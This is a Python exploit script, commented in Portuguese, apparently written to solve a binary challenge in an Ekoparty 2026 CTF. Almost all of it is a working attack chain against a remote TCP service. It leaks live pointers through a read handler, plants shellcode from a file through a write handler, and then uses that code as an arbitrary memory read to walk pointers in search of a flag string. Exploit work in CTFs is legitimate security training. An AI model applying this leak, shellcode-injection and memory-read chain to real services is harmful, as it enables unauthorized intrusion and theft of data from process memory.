#!/usr/bin/env python3
# Chase do ponteiro global 0xe370 (dica: handler flag=2 checa ele). TUDO em 1 conexao:
#   flag=1 le DLL+0xe340..0xe3c0 (ponteiros vivos) -> flag=2 planta sc_absread -> flag=0 segue os ptrs.
# Uso: python3 chase_e370.py
import socket, struct, re, sys, os, time
HOST, PORT = "<IP>", 20269
COOKIE  = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
SLOT    = 0x1620
HIK     = re.compile(rb'HIK_[\x20-\x7e]{6,200}')
D       = os.path.dirname(os.path.abspath(__file__))
u64 = lambda b,o=0: struct.unpack("<Q", b[o:o+8])[0]

def rd(s, n, to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout, ConnectionResetError, OSError): pass
    return b

def req(s, flag, counter, length, body=b""):
    s.sendall(struct.pack("<IBII", 13+len(body), flag, counter, length)+body)
    return rd(s, length)

def healthy(tries=10, wait=80):
    for i in range(tries):
        try:
            s=socket.create_connection((HOST,PORT),timeout=8)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
        except Exception as e:
            print("connect fail:",e); time.sleep(wait); continue
        s.sendall(COOKIE); b=rd(s,20)
        if b==HEALTHY:
            print(f"[+] banner OK (tentativa {i+1})"); return s
        print(f"[.] degradado ({b.hex()}), retry {i+1}/{tries} em {wait}s"); s.close()
        if i<tries-1: time.sleep(wait)
    return None

def absread(s, addr, length):
    return req(s, 0, 0, length, struct.pack("<Q", addr).ljust(max(length,8), b"\x00"))

def plausible(v):
    return (0x10000<=v<0x7ff000000000) or (0x7ff000000000<=v<0x800000000000)

def main():
    s=healthy()
    if not s: print("sem banner saudavel apos retries; servidor em cooldown/restart."); return

    # 1) RECON via flag=1 (read original, DLL-relativo) -- 0xe340..0xe3c0
    win=req(s,1,0xe340,0x80)
    print(f"[recon] DLL+0xe340 len={len(win)}")
    cands=[]
    for i in range(0,len(win)-7,8):
        off=0xe340+i; v=u64(win,i)
        mark=""
        if off in (0xe370,0xe3a0): mark=" <== dica/heap"
        print(f"  0x{off:x} = 0x{v:016x}{mark}")
        if plausible(v): cands.append((off,v))
    # prioriza 0xe370 e 0xe3a0
    cands.sort(key=lambda c: (c[0]!=0xe370, c[0]!=0xe3a0, c[0]))

    # 2) planta sc_absread (flag=2) no slot morto
    sc=open(os.path.join(D,"sc_absread.bin"),"rb").read()
    pr=req(s,2,SLOT,len(sc),sc)
    if len(pr)==0:
        print("[!] patch sc_absread falhou (gate fechou)"); s.close(); return
    print(f"[+] sc_absread plantado ({len(sc)}B)")

    # 3) segue cada ponteiro candidato com flag=0 (absread), procura HIK_
    found=[]
    seen=set()
    def probe(addr, why):
        if addr in seen or not plausible(addr): return
        seen.add(addr)
        base=addr-0x40
        r=absread(s, base, 0x400)
        m=HIK.search(r)
        asc=''.join(chr(x) if 32<=x<127 else '.' for x in r[:48])
        print(f"  [{why}] 0x{addr:x} (-0x40): {r[:16].hex()} | {asc}")
        if m:
            fl=m.group().decode(errors='replace'); print(f"    >>> HIK: {fl}"); found.append(fl)
        # segue ponteiros DENTRO do que lemos (1 nivel)
        return r

    for off,v in cands:
        r=probe(v, f"*0x{off:x}")
        if r:
            for j in range(0,len(r)-7,8):
                pv=u64(r,j)
                if plausible(pv):
                    rr=probe(pv, f"*0x{off:x}->+0x{j:x}")
                    if found: break
        if found: break

    s.close()
    print("\n== RESUMO ==")
    if found:
        for f in set(found): print("FLAG2 CANDIDATA:", f)
    else:
        print("nenhum HIK_ via 0xe370/0xe3a0; checar recon acima p/ outros ptrs ou voltar ao heap-walk.")

if __name__=="__main__":
    main()
